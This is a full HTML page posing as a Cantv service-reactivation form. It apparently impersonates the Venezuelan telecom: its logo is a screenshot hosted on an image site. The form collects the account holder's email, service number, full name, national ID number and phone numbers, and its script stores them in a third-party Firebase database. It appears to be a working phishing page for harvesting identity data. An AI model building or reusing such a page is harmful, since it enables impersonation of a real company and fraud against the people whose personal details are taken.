<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reactivación de tu servicio Cantv</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: auto;
            background-color: transparent;
        }
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="flex justify-center items-start p-2 sm:p-4">

    <div class="w-full max-w-md sm:max-w-lg bg-white rounded-xl shadow-lg overflow-hidden transition-all duration-300 my-2 border border-gray-100">
        
        <a href="https://ibb.co/CKJVLW8b" target="_blank" class="block w-full bg-blue-50">
            <img src="https://i.ibb.co/B24Tkw3y/Captura-de-pantalla-2026-08-20-234627.png" 
                 alt="Captura-de-pantalla-2026-08-20-234627" 
                 class="w-full h-auto max-h-20 sm:max-h-24 md:max-h-28 object-contain mx-auto" />
        </a>

        <div class="p-5 sm:p-8 pt-5 sm:pt-6">
            
            <div class="mb-6 sm:mb-8 text-center">
                <h2 class="text-xl sm:text-2xl font-bold text-gray-800 mb-2">Reactivación de tu servicio Cantv</h2>
                <p class="text-xs sm:text-sm text-gray-500">Completa los campos para gestionar tu solicitud</p>
            </div>

            <form id="cantvForm" class="space-y-4 sm:space-y-6">
                
                <div>
                    <label for="email_principal" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Dirección de correo electrónico</label>
                    <input type="email" id="email_principal" name="email_principal" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="tu@correo.com" />
                </div>

                <div>
                    <label for="numero_servicio" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Número del servicio</label>
                    <input type="tel" id="numero_servicio" name="numero_servicio" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="Ej. 02121234567" />
                </div>

                <div>
                    <label for="nombre_titular" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Nombre y apellido del titular</label>
                    <input type="text" id="nombre_titular" name="nombre_titular" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="Ej. Juan Pérez" />
                </div>

                <div>
                    <label for="cedula_titular" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Cédula de Identidad del titular</label>
                    <input type="text" id="cedula_titular" name="cedula_titular" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="Ej. 12345678" />
                </div>

                <div>
                    <label for="celular_1" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Número celular de contacto (1)</label>
                    <input type="tel" id="celular_1" name="celular_1" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="Ej. 04141234567" />
                </div>

                <div>
                    <label for="celular_2" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Número celular de contacto (2) <span class="font-normal text-xs text-gray-400">(Opcional)</span></label>
                    <input type="tel" id="celular_2" name="celular_2"
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="Ej. 04121234567" />
                </div>

                <div>
                    <label for="email_contacto" class="block text-sm sm:text-base font-bold text-gray-700 mb-1">Correo electrónico alternativo</label>
                    <input type="email" id="email_contacto" name="email_contacto" required
                        class="w-full px-4 py-2 sm:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors duration-200 outline-none text-sm sm:text-base"
                        placeholder="otro@correo.com" />
                </div>

                <div id="messageDiv" class="hidden rounded-lg p-3 sm:p-4 mt-4 text-sm sm:text-base text-center font-medium"></div>

                <div class="pt-2 sm:pt-4">
                    <button type="submit" id="submitBtn"
                        class="w-full bg-blue-600 hover:bg-blue-700 active:scale-[0.99] text-white font-bold py-3 sm:py-4 px-4 rounded-lg shadow-sm transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-2 text-base sm:text-lg">
                        <span id="btnText">Enviar Solicitud</span>
                    </button>
                </div>

            </form>
        </div> 
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-analytics.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";

        // Credenciales de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAVU2-Qqb80yMKH-LwSkGftAApK0xzLke4",
            authDomain: "cantv-solicitudes.firebaseapp.com",
            projectId: "cantv-solicitudes",
            storageBucket: "cantv-solicitudes.firebasestorage.app",
            messagingSenderId: "446436399884",
            appId: "1:446436399884:web:3c309cd4f4d17298c94729",
            measurementId: "G-TPX61JE399"
        };

        // Inicializar Firebase, Analytics y Firestore Database
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const db = getFirestore(app);

        // Elementos DOM
        const form = document.getElementById('cantvForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const messageDiv = document.getElementById('messageDiv');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            // Estado de carga
            submitBtn.disabled = true;
            btnText.innerText = 'Enviando Datos...';
            submitBtn.classList.add('opacity-70', 'cursor-not-allowed');
            messageDiv.classList.add('hidden');

            const payload = {
                email_principal: document.getElementById('email_principal').value.trim(),
                numero_servicio: document.getElementById('numero_servicio').value.trim(),
                nombre_titular: document.getElementById('nombre_titular').value.trim(),
                cedula_titular: document.getElementById('cedula_titular').value.trim(),
                celular_1: document.getElementById('celular_1').value.trim(),
                celular_2: document.getElementById('celular_2').value.trim() || null,
                email_contacto: document.getElementById('email_contacto').value.trim(),
                fecha_registro: serverTimestamp()
            };

            try {
                // Registrar documento en la colección 'solicitudes'
                await addDoc(collection(db, "solicitudes"), payload);

                // Mensaje de éxito
                messageDiv.innerHTML = '<span class="font-bold">¡Solicitud enviada!</span> Los datos han sido registrados exitosamente.';
                messageDiv.className = 'rounded-lg p-3 sm:p-4 mt-4 text-center bg-green-100 text-green-700 border border-green-400 block text-sm sm:text-base';
                form.reset();

            } catch (error) {
                console.error("Error al registrar en Firebase:", error);
                messageDiv.innerHTML = '<span class="font-bold">Error:</span> No se pudo guardar la información. Asegúrate de tener conexión a internet.';
                messageDiv.className = 'rounded-lg p-3 sm:p-4 mt-4 text-center bg-red-100 text-red-700 border border-red-400 block text-sm sm:text-base';
            } finally {
                // Restaurar estado del botón
                submitBtn.disabled = false;
                btnText.innerText = 'Enviar Solicitud';
                submitBtn.classList.remove('opacity-70', 'cursor-not-allowed');
            }
        });
    </script>
</body>
</html>
